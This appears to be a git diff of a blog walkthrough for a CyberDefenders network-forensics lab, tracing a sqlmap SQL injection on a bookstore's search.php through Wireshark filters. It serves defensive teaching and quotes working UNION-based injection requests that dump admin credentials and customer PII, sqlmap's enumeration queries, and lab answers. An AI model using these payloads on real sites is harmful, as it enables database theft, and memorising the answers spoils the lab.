@@ -1,6 +1,6 @@
 ---
 title: Network Forensics - Web Investigation @CyberDefender
-date: 2025-08-30 00:00:00 +0700
+date: 2025-9-3 00:00:00 +0700
 categories: [dfir, blue-teaming, cyber-defender]
 tags: [digital-forensics, network-forensics]
 author: <author_id>
@@ -111,28 +111,30 @@ There were numerous SQLi requests related to `search.php`, indicating the advers
 
 #### Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?
 
-This question tests us a bit from offensive security point of view, if we apply the same filter on previous question to track down activities, we won't find the answer for this type question.
+This question tests us from an offensive-security point of view. If we apply the same filter used in the previous question to track down activity, we won't find the answer for this type of question.
 
-> Question: Before adversary use their tools for automation purpose, what action taken first by them ? 
+> Question: Before adversary use their tools for automation, what action do they take first ? 
 {: .prompt-tip }
 
-If sit in Bug Bounty chair, there's a chance he/she will catch a bug first just by some manual tests, and then by identify there's truly a vulnerability in system, they now use tools for automation.
+If you're in a Bug Bounty role, there's a chance the researcher will find a bug first through manual testing. After confirming that a vulnerability actually exists in the system, they will use tools to automate further testing.
 
-So, instead of apply previous Wireshark filter, because we've identified adversary IP Address, also vulnerable PHP script, we could conduct a filter like below:
+That's why we couldn't just analyze adversary behavior by only their tools User-Agent strings, but trace back to their very first interaction on compromised system.
+
+So, instead of applying the previous Wireshark filter, since we've already identified the adversary's IP address and the vulnerable PHP script, we can use a filter like this:
 
 ```sql
 ip.addr == 111.224.250.131 && frame contains "search.php?"
 ```
 
-And then mark entire output by Ctrl + Shift + M.
+Mark entire output by Ctrl + Shift + M, we only want to extract relevant information to reduce noises.
 
 ![pic10](assets/images/cyberdefender/webinvestigation/pic10.png)
 
-Now, export marked packet by using Export Packets Dissections feature in Wireshark.
+Now, export marked packets by using Export Packets Dissections feature in Wireshark.
 
 ![pic11](assets/images/cyberdefender/webinvestigation/pic11.png)
 
-We could utilize tool like CyberChef to decoded entire column to start our investigation.
+From now, we could utilize tool like CyberChef to decoded entire Info column which is contain main payloads to start our investigation.
 
 ![pic12](assets/images/cyberdefender/webinvestigation/pic12.png)
 
@@ -276,40 +278,19 @@ GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRA
 
 #### Q5: Can you provide the complete request URI that was used to read the web server's available databases?
 
-If you're not familiar with database and it's structure, this question definitely gonna be a tough one.
+By successfully indentifying improper validation that led to SQL injection, the adversary began using sqlmap to automate their exploitation attempts. 
 
-Either you trying to find adversary activities and behavior of the tools.
+Understand adversary tools utilities and behavior in such cases is important. For an in-depth investigation, we should examine the tool's source code itself, to understand how it behaves.
 
-But it's okay, let's do some "reverse engineering" works to understand adversary behavior.
+Below is a snippet [sqlmap](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) queries define per database:
 
-Knowing which tools has been used by adversary assist us on identify behavior of its action and also help us - defenders detect other phase in kill-chain.
-
-Since we knew adversary utilized sqlmap for SQLi
-
+**MySQL**:
 ```xml
-        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
-        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
-        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
-        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
-        <users>
-            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
-            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
-        </users>
-        <!-- https://github.com/dev-sec/mysql-baseline/issues/35 -->
-        <!-- https://stackoverflow.com/a/31122246 -->
-        <passwords>
-            <inband query="SELECT user,authentication_string FROM mysql.user" condition="user"/>
-            <blind query="SELECT DISTINCT(authentication_string) FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(authentication_string)) FROM mysql.user WHERE user='%s'"/>
-        </passwords>
-        <privileges>
-            <inband query="SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES" condition="grantee" query2="SELECT user,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user" condition2="user"/>
-            <blind query="SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s' LIMIT %d,1" query2="SELECT select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s'" count2="SELECT COUNT(*) FROM mysql.user WHERE user='%s'"/>
-        </privileges>
-        <roles/>
-        <statements>
-            <inband query="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST" query2="SELECT INFO FROM DATA_DICTIONARY.PROCESSLIST"/>
-            <blind query="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST ORDER BY ID LIMIT %d,1" query2="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE ID=%d" query3="SELECT ID FROM INFORMATION_SCHEMA.PROCESSLIST LIMIT %d,1" count="SELECT COUNT(DISTINCT(INFO)) FROM INFORMATION_SCHEMA.PROCESSLIST"/>
-        </statements>
+<root>
+    <dbms value="MySQL">
+        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
+        <cast query="CAST(%s AS NCHAR)"/>
+        ...
         <dbs>
             <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA" query2="SELECT db FROM mysql.db"/>
             <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1" query2="SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db"/>
@@ -322,28 +303,121 @@ Since we knew adversary utilized sqlmap for SQLi
             <inband query="SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
             <blind query="SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" query2="SELECT column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND column_name='%s' AND table_schema='%s'" count="SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
         </columns>
-        <dump_table>
-            <inband query="SELECT %s FROM %s.%s ORDER BY %s"/>
-            <blind query="SELECT %s FROM %s.%s ORDER BY %s LIMIT %d,1" count="SELECT COUNT(*) FROM %s.%s"/>
-        </dump_table>
-        <search_db>
-            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT db FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
-            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT DISTINCT(db) FROM mysql.db WHERE %s" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
-        </search_db>
-        <search_table>
-            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES WHERE %s" condition="table_name" condition2="table_schema"/>
-            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.TABLES WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.TABLES WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" condition="table_name" condition2="table_schema"/>
-        </search_table>
-        <search_column>
-            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" condition="column_name" condition2="table_schema" condition3="table_name"/>
-            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" condition="column_name" condition2="table_schema" condition3="table_name"/>
-        </search_column>
-    </dbms>
+        ....
 ```
+
+**PostgreSQL**
+```xml
+    <dbms value="PostgreSQL">
+        <cast query="CAST(%s AS VARCHAR(10000))"/>
+        <length query="LENGTH(%s)"/>
+        <!-- NOTE: PostgreSQL does not like COALESCE with different data-types (e.g. COALESCE(id,' ')) -->
+        ...
+        <dbs>
+            <inband query="SELECT DISTINCT(schemaname) FROM pg_tables"/>
+            <blind query="SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET %d LIMIT 1" count="SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables"/>
+        </dbs>
+        <tables>
+            <inband query="SELECT schemaname,tablename FROM pg_tables" condition="schemaname" query2="SELECT table_schema,table_name FROM information_schema.tables" condition2="table_schema"/>
+            <blind query="SELECT tablename FROM pg_tables WHERE schemaname='%s' ORDER BY tablename OFFSET %d LIMIT 1" count="SELECT COUNT(tablename) FROM pg_tables WHERE schemaname='%s'" query2="SELECT table_name FROM information_schema.tables WHERE table_schema='%s' OFFSET %d LIMIT 1" count2="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='%s'"/>
+        </tables>
+        <columns>
+            <inband query="SELECT attname,typname FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s' ORDER BY attname" condition="attname"/>
+            <blind query="SELECT attname FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s' ORDER BY attname" query2="SELECT typname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relname='%s' AND a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND attname='%s' AND nspname='%s' ORDER BY attname" count="SELECT COUNT(attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s'" condition="attname"/>
+        </columns>
+        ...
+```
+
+**Oracle**
+```xml
+    <dbms value="Oracle">
+        <cast query="CAST(%s AS VARCHAR(4000))"/>
+        <length query="LENGTH(%s)"/>
+        <isnull query="NVL(%s,' ')"/>
+        <delimiter query="||"/>
+        ...
+        <!-- NOTE: in Oracle schema names are the counterpart to database names on other DBMSes -->
+        <dbs>
+            <inband query="SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)"/>
+            <blind query="SELECT OWNER FROM (SELECT OWNER,ROWNUM AS CAP FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE CAP=%d" count="SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES"/>
+        </dbs>
+        <tables>
+            <inband query="SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES" condition="OWNER"/>
+            <blind query="SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS CAP FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE CAP=%d" count="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s'"/>
+        </tables>
+        ... 
+```
+
+Each databases has slightly different queries and detecting which queries the server accepts in this scenario could help us answer the question. 
+
+By inspecting the payloads in previous questions, we identified multiple SQLi methods used by adversary such as basic [Inline Query](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/inline_query.xml) with few samples like:
+```sql
+GET /search.php?search=test’ OR 1=1; -- HTTP/1.1
+GET /search.php?search=' or 1=1; -- - HTTP/1.1
+GET /search.php?search=book and 1=1; -- - HTTP/1.1
+GET /search.php?search=book and 1=2; -- - HTTP/1.1
+```
+
+or Union Query like:
+```sql
+GET /search.php?search=book&ZscL=7696 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables ... HTTP/1.1
+
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',JSON_ARRAYAGG(...)),'qvpjq') FROM INFORMATION_SCHEMA.SCHEMATA-- - HTTP/1.1
+
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(...,JSON_ARRAYAGG(CONCAT_WS(...,table_name)),...) FROM INFORMATION_SCHEMA.TABLES ... HTTP/1.1
+```
+
+And at the end of adversary's sqlmap scan, we detected few interesting events:
+
+```sql
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- - HTTP/1.1 
+GET /search.php?search=book HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,table_name)),0x7176706a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x626f6f6b776f726c645f6462)-- - HTTP/1.1 
+GET /search.php?search=book HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
+GET /search.php?search=book HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x637573746f6d657273 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
+GET /search.php?search=book HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x626f6f6b73 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,title)),0x7176706a71) FROM bookworld_db.books-- - HTTP/1.1 
+```
+
+First we observed `GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -` which matchs the MySQL queries example for querying Database metadata. 
+
+The server responsed with HTTP 200, indicating the adversary sucessfully exfiltrated database information
+
+```sql
+ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.method == GET && frame contains "INFORMATION_SCHEMA.SCHEMATA"|| http.response.code == 200
+```
+
+![pic13](assets/images/cyberdefender/webinvestigation/pic13.png)
 
 > ANSWER: `/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -`
 {: .prompt-info }
+
 #### Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?
+
+Following from previous question, not only exfiltrated database information, we identified other malicious activities.
+
+- **Exfiltrated adminitrator information from database `bookwork_db` included id, username and password**
+```sql
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
+```
+
+Wireshark filter indicating adversary successfully exfiltrated admin information from `bookwork_db`
+```sql
+ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.method == GET && frame contains "bookworld_db"|| http.response.code == 200
+```
+![pic14](assets/images/cyberdefender/webinvestigation/pic14.png)
+
+- **Exfiltrated sensitive data from clients from database `bookwork_db` included their PIIs**
+```sql
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
+```
+Wireshark filter indicating adversary successfully exfiltrated customer's PII from `bookwork_db`.
+![pic15](assets/images/cyberdefender/webinvestigation/pic15.png)
 
 > ANSWER: `customers`
 {: .prompt-info }
